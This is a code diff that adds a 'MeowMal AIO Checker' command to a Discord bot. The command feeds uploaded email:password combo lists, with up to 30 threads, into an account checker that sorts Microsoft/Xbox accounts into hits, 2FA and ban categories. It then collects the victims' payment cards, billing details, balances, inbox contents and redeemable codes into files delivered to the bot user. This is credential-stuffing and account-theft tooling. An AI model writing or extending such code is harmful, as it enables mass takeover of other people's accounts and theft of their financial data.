@@ -1210,6 +1210,117 @@ async function handleXboxChk(respond, userId, accountsRaw, accountsFile, threads
   }
 }
 
+// ── MeowMal AIO Checker ─────────────────────────────────────
+
+async function handleAio(respond, userId, accountsRaw, accountsFile, threads = 30, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed("You are not authorized.")] });
+  if (!limiter.acquire(userId)) return respond({ embeds: [errorEmbed("You already have an active process.")] });
+
+  try {
+    const combos = await gatherCombos(accountsRaw, accountsFile);
+    if (!combos || !combos.length) return respond({ embeds: [errorEmbed("No valid email:pass combos found.")] });
+    if (combos.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Max ${MAX_COMBO_LINES} lines.`)] });
+
+    const tc = Math.min(Math.max(threads, 1), 30);
+    const msg = await respond({ embeds: [aioProgressEmbed(0, combos.length)] });
+    const ac = new AbortController();
+    activeAborts.set(userId, ac);
+
+    const t0 = Date.now();
+    let lastEdit = 0;
+    const live = {
+      hits: 0, bad: 0, twofa: 0, valid_mail: 0,
+      xgp: 0, xgpu: 0, mfa: 0, sfa: 0,
+      payment_methods: 0, errors: 0, banned: 0, unbanned: 0,
+    };
+
+    const { results, stats: finalStats, files: resultFiles } = await runAioCheck(combos, tc, (done, total, r) => {
+      if (r) {
+        const st = r.status;
+        if (st === "hit") live.hits++;
+        else if (st === "2fa") live.twofa++;
+        else if (st === "valid_mail") live.valid_mail++;
+        else if (st === "bad" || st === "fail" || st === "error") live.bad++;
+        else live.bad++;
+
+        if (r.xgp) live.xgp++;
+        if (r.xgpu) live.xgpu++;
+        if (r.mfa) live.mfa++;
+        if (r.sfa) live.sfa++;
+        if (r.has_payment) live.payment_methods++;
+        if (r.banned) live.banned++;
+        if (r.unbanned) live.unbanned++;
+        if (r.error) live.errors++;
+      }
+
+      const now = Date.now();
+      if (now - lastEdit < 1500) return;
+      lastEdit = now;
+      const sec = (now - t0) / 1000;
+      const cpm = sec > 0 ? Math.round(done / (sec / 60)) : 0;
+      updateProgress(msg, aioProgressEmbed(done, total, { ...live, cpm }), userId).catch(() => {});
+    }, ac.signal);
+
+    activeAborts.delete(userId);
+
+    const sec = ((Date.now() - t0) / 1000).toFixed(1);
+    const s = {
+      checked: finalStats.checked || combos.length,
+      hits: finalStats.hits, bad: finalStats.bad, twofa: finalStats.twofa,
+      valid_mail: finalStats.valid_mail, xgp: finalStats.xgp, xgpu: finalStats.xgpu,
+      mfa: finalStats.mfa, sfa: finalStats.sfa, payment_methods: finalStats.payment_methods,
+      banned: finalStats.banned, unbanned: finalStats.unbanned, errors: finalStats.errors,
+      elapsed: `${sec}s`,
+      cpm: sec > 0 ? Math.round((finalStats.checked || combos.length) / (sec / 60)) : 0,
+    };
+
+    const attachments = [];
+    const fileMap = {
+      "Hits.txt": resultFiles.hits,
+      "Normal.txt": resultFiles.normal,
+      "XGP.txt": resultFiles.xgp,
+      "XGPU.txt": resultFiles.xgpu,
+      "2FA.txt": resultFiles.twofa,
+      "Valid_Mail.txt": resultFiles.valid_mail,
+      "Bad.txt": resultFiles.bads,
+      "Capture.txt": resultFiles.capture,
+      "Cards.txt": resultFiles.cards,
+      "Banned.txt": resultFiles.banned,
+      "Unbanned.txt": resultFiles.unbanned,
+      "MFA.txt": resultFiles.mfa,
+      "SFA.txt": resultFiles.sfa,
+      "MS_Points.txt": resultFiles.ms_points,
+      "MS_Balance.txt": resultFiles.ms_balance,
+      "Subscriptions.txt": resultFiles.subscriptions,
+      "Orders.txt": resultFiles.orders,
+      "Billing.txt": resultFiles.billing,
+      "Inbox.txt": resultFiles.inbox,
+      "Codes.txt": resultFiles.codes,
+    };
+
+    for (const [name, lines] of Object.entries(fileMap)) {
+      if (lines && lines.length) attachments.push(textAttachment(lines, name));
+    }
+
+    statsManager.record("aio", s);
+
+    const target = dmUser || null;
+    if (target) {
+      try {
+        const dm = await target.createDM();
+        await dm.send({ embeds: [aioResultsEmbed(s)], files: attachments });
+        await msg.edit({ embeds: [successEmbed(`Done — ${s.checked} checked. Results sent to DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [aioResultsEmbed(s)], files: attachments, components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [aioResultsEmbed(s)], files: attachments, components: [] });
+    }
+  } finally {
+    limiter.release(userId);
+  }
+}
+
 // ── Slash Commands ───────────────────────────────────────────
 
 client.on("interactionCreate", async (interaction) => {
